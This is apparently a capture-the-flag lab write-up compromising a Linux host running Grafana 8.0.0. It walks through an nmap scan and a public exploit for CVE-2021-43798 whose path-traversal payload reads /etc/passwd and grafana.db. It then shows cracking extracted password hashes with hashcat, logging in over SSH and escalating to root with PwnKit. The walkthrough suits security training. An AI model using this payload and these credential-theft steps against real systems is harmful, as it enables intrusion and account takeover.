- I. [Enumeration](#enumeration)
  - II. [Nmap](#nmap)
- III. [Grafana port 3000](#grafana-port-3000)
  - IV. [Exploitation](#exploitation)
- V. [Cracking passwords](#cracking-passwords)
  - VI. [Prepare hashes](#prepare-hashes)
  - VII. [Hashcat](#hashcat)
- VIII. [Connect to ssh](#connect-to-ssh)
- IX. [Privilege escalation](#privilege-escalation)

# Enumeration

##  Nmap
I started with nmap scan.

```
┌─[qrxnz@parrot]─[~/Documents]
└──╼ $nmap -Pn -p- -sC -sV -A 10.10.100.11
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-09 15:54 CET
Nmap scan report for 10.10.100.11
Host is up (0.044s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cd7a5d9b9b7386fa92fd4b9feb73fc3d (RSA)
|   256 27c3d05e8f469b9fb0c26cff00f7a773 (ECDSA)
|_  256 b41fd4e6df2b28100a6af9b72cf2bdf2 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Sat, 09 Dec 2023 14:55:59 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Sat, 09 Dec 2023 14:55:24 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Sat, 09 Dec 2023 14:55:31 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.93%I=7%D=12/9%Time=65747FDC%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,174,"HTTP/1\.0\x20302\x20Found\r\nCache-Contro
SF:l:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nExpir
SF:es:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cookie:\
SF:x20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Conten
SF:t-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protect
SF:ion:\x201;\x20mode=block\r\nDate:\x20Sat,\x2009\x20Dec\x202023\x2014:55
SF::24\x20GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found<
SF:/a>\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\nCac
SF:he-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPra
SF:gma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20HttpO
SF:nly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-O
SF:ptions:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Sa
SF:t,\x2009\x20Dec\x202023\x2014:55:31\x20GMT\r\nContent-Length:\x200\r\n\
SF:r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSess
SF:ionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(FourOhFourRequest,1A1,"HTTP/1\.0\x20302\x20Found\
SF:r\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset
SF:=utf-8\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\
SF:r\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity\.txt
SF:%252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protection:\x201;
SF:\x20mode=block\r\nDate:\x20Sat,\x2009\x20Dec\x202023\x2014:55:59\x20GMT
SF:\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</a>\.\n\n"
SF:);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.80 seconds
```

We see 2 open ports, ssh 7.6 and the http server on port 3000 looks interesting.

# Grafana port 3000
On the login page we see Grafana version 8.0.0

```
~
❯ searchsploit grafana
-------------------------------------------------------------------
 Exploit Title
-------------------------------------------------------------------
Grafana 7.0.1 - Denial of Service (PoC)
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read
Grafana <=6.2.4 - HTML Injection
-------------------------------------------------------------------
```

Grafana below 8.3.0 is vulnerable, so we can attack our target.

## Exploitation
Before I run the [exploit](https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798), I added the line `10.10.100.11 data.vl` in `/etc/hosts`.

```
┌─[qrxnz@parrot]─[~/ezploits/exploit-grafana-CVE-2021-43798]
└──╼ $python3 exploit.py 
  _____   _____   ___ __ ___ _     _ _ ________ ___ ___ 
 / __\ \ / / __|_|_  )  \_  ) |___| | |__ /__  / _ ( _ )
| (__ \ V /| _|___/ / () / /| |___|_  _|_ \ / /\_, / _ \
 \___| \_/ |___| /___\__/___|_|     |_|___//_/  /_/\___/
                @pedrohavay / @acassio22

? Enter the target list:  ./targets.txt

========================================

[i] Target: http://data.vl:3000

[!] Payload "http://data.vl:3000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd" works.

[i] Analysing files...

[i] File "/conf/defaults.ini" found in server.
[*] File saved in "./http_data_vl_3000/defaults.ini".

[i] File "/etc/grafana/grafana.ini" found in server.
[*] File saved in "./http_data_vl_3000/grafana.ini".

[i] File "/etc/passwd" found in server.
[*] File saved in "./http_data_vl_3000/passwd".

[i] File "/var/lib/grafana/grafana.db" found in server.
[*] File saved in "./http_data_vl_3000/grafana.db".

[i] File "/proc/self/cmdline" found in server.
[*] File saved in "./http_data_vl_3000/cmdline".

? Do you want to try to extract the passwords from the data source?  Yes

[i] Secret Key: SW2YcwTIb9zpOOhoPsMm

[*] Bye Bye!
```

```
sqlite> select * from user;
1|0|admin|admin@localhost||7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S|hLLY6QQ4Y6||1|1|0||2022-01-23 12:48:04|2022-01-23 12:48:50|0|2022-01-23 12:48:50|0
2|0|boris|boris@data.vl|boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|mYl941ma8w||1|0|0||2022-01-23 12:49:11|2022-01-23 12:49:11|0|2012-01-23 12:49:11|0
```

Currently we can try to crack the hashes from the database.

# Cracking passwords
Hashes in Grafana are stored in an unusual format, this [article](https://vulncheck.com/blog/grafana-cve-2021-43798) explains how to prepare hashes for cracking.

##  Prepare hashes
```
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=
sha256:10000:WU9iU29MajU1Uw==:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg=
```

After using the program from the article, we have a hash format understandable by hashcat.

## Hashcat
```
hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt
```

Boris's password is quite easy to crack.

# Connect to ssh
```
boris@ip-10-10-10-11:~$ ls
snap  user.txt
```
We can login to SSH with the broken password, we can start privilege escalation!

# Privilege escalation
To gain root access, I used [PwnKit](https://github.com/ly4k/PwnKit)
